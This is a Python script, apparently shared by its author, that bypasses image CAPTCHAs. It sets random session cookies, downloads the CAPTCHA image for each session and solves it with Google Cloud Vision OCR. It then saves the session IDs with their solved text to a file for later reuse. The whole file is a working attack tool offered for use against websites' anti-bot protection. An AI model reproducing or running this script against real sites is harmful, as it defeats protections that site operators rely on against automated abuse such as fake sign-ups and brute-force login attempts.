# Script by: twitter.com/3zizMe_

import re
import requests
import random
import string
from google.cloud import vision
import argparse

banner = '''
███╗░░██╗░█████╗░░██████╗███╗░░██╗░█████╗░░██████╗
████╗░██║██╔══██╗██╔════╝████╗░██║██╔══██╗██╔════╝
██╔██╗██║███████║╚█████╗░██╔██╗██║███████║╚█████╗░
██║╚████║██╔══██║░╚═══██╗██║╚████║██╔══██║░╚═══██╗
██║░╚███║██║░░██║██████╔╝██║░╚███║██║░░██║██████╔╝
╚═╝░░╚══╝╚═╝░░╚═╝╚═════╝░╚═╝░░╚══╝╚═╝░░╚═╝╚═════╝░
                by: twitter.com/3zizMe_
'''

print(banner)

def generate_random_session_id(length=11):
    letters = string.ascii_letters + string.digits
    return ''.join(random.choice(letters) for i in range(length))

def detect_text(image_content):
    client = vision.ImageAnnotatorClient()
    image = vision.Image(content=image_content)

    response = client.text_detection(image=image)
    texts = response.text_annotations

    if texts and texts[0].description:
        filtered_text = re.sub(r'[^a-zA-Z0-9]', '', texts[0].description)
        if filtered_text and len(filtered_text) == args.length:
            return filtered_text
    return None

def process_requests(urls, num_requests, header):
    results = []

    for _ in range(num_requests):
        session_id = generate_random_session_id()
        headers = {
            'Cookie': f'{header}={session_id}',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0'
        }

        response = requests.get(urls[0], headers=headers)

        if response.status_code == 200:
            result = detect_text(response.content)
            if result is not None:
                results.append(f'{header}: {session_id}, Filtered text: {result}')
        else:
            print(f'Failed to retrieve captcha image. Status code: {response.status_code}')

    filtered_results = [result for result in results if len(result.split(': ')[-1]) == args.length]

    extracted_results = []
    if args.extract_strings:
        extracted_results.extend([result for result in filtered_results if result.split(': ')[-1].isalpha()])
    if args.extract_numbers:
        extracted_results.extend([result for result in filtered_results if result.split(': ')[-1].isdigit()])

    with open('captcha_results.txt', 'w') as file:
        file.write('\n'.join(extracted_results))

    print('Results saved to captcha_results.txt')

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Bypass Captcha Image')
    parser.add_argument('-n', '--num-requests', type=int, required=True, help='Number of requests to generate')
    parser.add_argument('-u', '--urls', nargs='+', required=True, help='URLs to request (space-separated if multiple)')
    parser.add_argument('-v', '--header-value', required=True, help='Header value for Cookie')
    parser.add_argument('-l', '--length', type=int, required=True, help='Desired number of characters')
    parser.add_argument('-es', '--extract-strings', action='store_true', help='Extract strings')
    parser.add_argument('-en', '--extract-numbers', action='store_true', help='Extract numbers')
    args = parser.parse_args()

    process_requests(args.urls, args.num_requests, args.header_value)
